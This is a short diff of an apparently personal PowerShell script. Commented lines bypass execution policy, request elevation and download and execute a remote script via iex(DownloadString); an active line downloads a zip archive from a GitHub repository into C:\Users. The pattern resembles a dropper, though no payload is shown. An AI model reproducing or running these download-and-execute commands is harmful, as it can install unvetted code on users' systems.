@@ -2,7 +2,8 @@
 #Set-ExecutionPolicy -ExecutionPolicy Bypass -force
 #powershell "start-process powershell -verb runas"
 #powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Admo9/Source/main/proyecto.ps1')"
-
+#win64
+#invoke-webrequest -uri "https://github.com/Admo9/ProJ01/raw/main/win64.zip" -outfile "C:\Users\win64.zip"
 
 invoke-webrequest -uri "https://github.com/Admo9/ProJ03/archive/refs/heads/main.zip" -outfile "C:\Users\win64.zip"
 
